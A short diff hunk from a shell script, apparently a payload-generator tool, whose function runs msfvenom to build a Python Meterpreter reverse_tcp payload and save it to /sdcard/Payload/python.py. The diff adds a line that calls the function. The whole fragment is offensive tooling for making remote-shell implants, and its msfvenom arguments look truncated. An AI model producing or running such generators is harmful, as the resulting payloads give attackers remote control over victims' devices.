@@ -7,3 +7,4 @@ p() {
 	msfvenom -p python/meterpreter/reverse_tcp R > /sdcard/Payload/python.py
 	printf "\n Completed\n\n"
 	}
+	p
